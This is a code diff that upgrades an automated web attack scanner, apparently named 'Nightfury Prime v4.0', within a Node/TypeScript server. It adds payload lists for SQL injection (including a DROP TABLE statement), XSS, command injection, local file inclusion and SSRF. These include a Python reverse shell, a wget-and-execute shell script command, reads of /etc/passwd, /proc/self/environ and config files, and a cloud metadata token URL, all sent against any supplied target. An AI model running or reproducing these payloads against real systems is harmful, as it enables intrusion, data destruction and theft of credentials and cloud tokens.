@@ -116,14 +116,16 @@ async function startServer() {
     res.json({ results: enriched });
   });
 
-  // NightFury Offensive Logic
+  // Nightfury Prime v4.0 Offensive Logic
   const USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Go-http-client/1.1",
     "curl/7.64.1",
-    "Nmap Scripting Engine; https://nmap.org/book/nse.html"
+    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
+    "sqlmap/1.7.11#stable (https://sqlmap.org)",
+    "Nikto/2.1.6"
   ];
 
   const getSessionHeaders = () => ({
@@ -170,46 +172,56 @@ async function startServer() {
   const VECTORS: Record<string, string[]> = {
     sqli: [
       "' OR '1'='1' -- ",
-      "' UNION SELECT NULL, user(), database() -- ",
+      "' UNION SELECT NULL, user(), database(), @@version, table_name FROM information_schema.tables -- ",
       "'; DROP TABLE users; -- ",
       "admin' -- ",
-      "1' AND SLEEP(5) -- "
+      "1' AND SLEEP(10) -- ",
+      "1') OR 1=1 --",
+      "'; EXEC sp_msforeachdb 'PRINT ''?''' --"
     ],
     xss: [
-      "<script>alert('XSS')</script>",
-      "<img src=x onerror=alert(1)>",
+      "<script>alert('XSS_SUCCESS_PROBE')</script>",
+      "<img src=x onerror=alert('XSS')>",
       "<svg/onload=alert(1)>",
       "javascript:alert('XSS')",
-      "';alert(String.fromCharCode(88,83,83));//"
+      "';alert(String.fromCharCode(88,83,83));//",
+      "\"'--><script>alert(1)</script>",
+      "<details open ontoggle=alert(1)>"
     ],
     rce: [
       "; cat /etc/passwd",
       "| whoami",
       "& dir",
       "$(id)",
-      "`id`"
+      "`id`",
+      "; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+      "; wget http://127.0.0.1/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
     ],
     lfi: [
       "../../../../etc/passwd",
       "..\\..\\..\\windows\\win.ini",
       "/etc/passwd",
-      "C:\\Windows\\System32\\drivers\\etc\\hosts"
+      "C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "/proc/self/environ",
+      "/var/log/apache2/access.log",
+      "php://filter/convert.base64-encode/resource=config.php"
     ],
     ssrf: [
       "http://169.254.169.254/latest/meta-data/",
       "http://localhost:8080/admin",
       "file:///etc/passwd",
       "http://127.0.0.1:2375/version", // Docker API
-      "http://172.31.87.11:8000/.env" // Internal subnet check
+      "http://172.31.87.11:8000/.env", // Internal subnet check
+      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
     ]
   };
 
   const INDICATORS: Record<string, string[]> = {
-    sqli: ['sql', 'mysql', 'database error', 'syntax error', 'you have an error'],
-    xss: ['<script>', 'alert(', 'onerror=', 'prompt('],
-    rce: ['uid=', 'root:', 'www-data', 'bin/bash', 'winver'],
-    lfi: ['root:x:', '[extensions]', 'file content'],
-    ssrf: ['instance-id', 'localhost', 'metadata']
+    sqli: ['sql', 'mysql', 'database error', 'syntax error', 'you have an error', 'information_schema', 'system_user'],
+    xss: ['<script>', 'alert(', 'onerror=', 'prompt(', 'XSS_SUCCESS_PROBE'],
+    rce: ['uid=', 'root:', 'www-data', 'bin/bash', 'winver', 'daemon:'],
+    lfi: ['root:x:', '[extensions]', 'file content', 'DOCUMENT_ROOT'],
+    ssrf: ['instance-id', 'localhost', 'metadata', 'serviceAccountEmail']
   };
 
   const checkSuccess = (response: string, vector: string) => {
@@ -231,12 +243,13 @@ async function startServer() {
 
     res.json({ status: "started" });
 
-    broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Starting NightFury scan on ${url}` });
+    broadcast({ type: "OFFENSIVE_LOG", payload: `[☠️] INITIALIZING NIGHTFURY PRIME v4.0 - ADVANCED ASSAULT CORE` });
+    broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Target acquisition established: ${url}` });
 
     try {
       const headers = getSessionHeaders();
       const response = await axios.get(url, { 
-        timeout: 10000, 
+        timeout: 15000, 
         validateStatus: () => true,
         headers 
       });
@@ -255,11 +268,9 @@ async function startServer() {
         } catch (e) {}
       });
 
-      const uniqueUrls = Array.from(new Set(urls)).slice(0, 8); 
-      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Discovered ${uniqueUrls.length} in-scope endpoints` });
-
-      // Live Ops: Host header spoofing check
-      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Testing for Host Header Injection / Poisoning...` });
+      const uniqueUrls = Array.from(new Set(urls)).slice(0, 15); 
+      broadcast({ type: "OFFENSIVE_LOG", payload: `[+] Discovered ${uniqueUrls.length} in-scope endpoints for audit.` });
+      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Launching Deep Vulnerability Discovery (DVD)...` });
       try {
         const spoofed = await axios.get(url, {
           headers: { ...headers, "Host": "127.0.0.1" },
